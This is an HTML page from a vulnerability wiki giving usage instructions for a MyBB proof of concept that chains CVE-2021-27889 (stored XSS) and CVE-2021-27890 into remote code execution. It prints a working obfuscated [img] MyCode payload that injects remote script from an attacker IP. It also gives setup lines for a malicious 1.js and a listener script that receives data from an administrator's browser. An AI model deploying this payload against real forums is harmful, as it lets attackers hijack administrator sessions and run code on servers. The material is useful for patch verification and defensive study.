<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MyBB/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%20%26%20CVE-2021-27889%29/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Mybb-XSS_SQL_RCE-POC(CVE-2021-27890 &amp; CVE-2021-27889) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Mybb-XSS_SQL_RCE-POC(CVE-2021-27890 \u0026amp; CVE-2021-27889)", url: "#_top", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" class="btn btn-xs btn-link">
        MySQL LOAD DATA 读取客户端任意文件
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        MyBB 后台代码执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="mybb-xss_sql_rce-poccve-2021-27890-cve-2021-27889">Mybb-XSS_SQL_RCE-POC(CVE-2021-27890 &amp; CVE-2021-27889)<a class="headerlink" href="#mybb-xss_sql_rce-poccve-2021-27890-cve-2021-27889" title="Permanent link">&para;</a></h1>
<p>Mybb associate CVE-2021-27890 &amp; CVE-2021-27889 to RCE poc
</br></p>
<p><strong>Before Use:</strong></p>
<p>There are two files here:  1.js and attack_listen.py</p>
<p>You should modify these two file:</p>
<p><strong>1.js:</strong></p>
<p>源码<a href="../resource/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%26CVE-2021-27889%29/media/1.js">1.js</a></p>
<p>modify the mybb forum url and attack url:</p>
<p><div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">bashurl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://192.168.92.164/mybb/mybb-mybb_1825&#39;</span><span class="w"> </span><span class="n">#mybb</span><span class="w"> </span><span class="nx">forum</span><span class="w"> </span><span class="nx">url</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">attack_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://192.168.92.165:8080/attack_success&#39;</span><span class="w"> </span><span class="n">#change</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">attack</span><span class="w"> </span><span class="nx">machine</span><span class="w"> </span><span class="nx">ip</span><span class="p">.</span><span class="nx">should</span><span class="w"> </span><span class="nx">keep</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">same</span><span class="w"> </span><span class="kd">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">attack_listen</span><span class="p">.</span><span class="nx">py</span>
</code></pre></div>
</br></p>
<p><strong>attack_listen.py</strong></p>
<p>源码<a href="../resource/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%26CVE-2021-27889%29/media/attack_listen.py">attack_listen.py</a></p>
<p>modify the attack host and attack port:</p>
<div class="highlight"><pre><span></span><code><span class="n">attack_host</span> <span class="o">=</span> <span class="s1">&#39;192.168.92.165&#39;</span>
<span class="n">attack_port</span> <span class="o">=</span> <span class="mi">8080</span>
</code></pre></div>
<p></br></p>
<p><strong>Usage:</strong></p>
<p>CVE-2021-27889 is xss. You should inject the following payload in "<strong>New Post Thread</strong>" or "<strong>Reply</strong>" or "<strong>Private Messages</strong>" before do the attack.In this demo,I send the payload to "New Post Thread"</p>
<p><em>notice that the <strong>192.168.92.165</strong> is the evil server ip,You should change it.</em></p>
<div class="highlight"><pre><span></span><code>[img]http://evil.com/xx(http://evil.com/onerror=xs1=String.fromCharCode(47);xa1=document.createElement(/script/.source);xa1.src=xs1+xs1+/192.168.92.165/.source+xs1+/1.js/.source;document.getElementById(/header/.source).append(xa1);//[/img]
</code></pre></div>
<p><img alt="" src="../resource/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%26CVE-2021-27889%29/media/1.png" /></p>
<p></br></p>
<p>Now Our evil js <strong>1.js</strong> is injected successful.Then we should wait an Admin browsed this Post with loggined admin page cookie.</p>
<p><em>Notice that the Admin user have no necessary loggin the forum page.</em></p>
<p></br></p>
<p>In our waiting time,We should run the "attack_listen.py" in our attack machine, To identify if the Admin user be attacked.</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>attack_listen.py
</code></pre></div>
<p></br></p>
<p>When the Admin user browsed the evil post,the evil js will do the attack:</p>
<p><img alt="" src="../resource/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%26CVE-2021-27889%29/media/2.png" /></p>
<p></br></p>
<p>We can receive the information at our attack machine:</p>
<p><img alt="" src="../resource/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%26CVE-2021-27889%29/media/3.png" /></p>
<p><img alt="" src="../resource/Mybb-XSS_SQL_RCE-POC%28CVE-2021-27890%26CVE-2021-27889%29/media/4.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" class="btn btn-xs btn-link">
        MySQL LOAD DATA 读取客户端任意文件
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        MyBB 后台代码执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>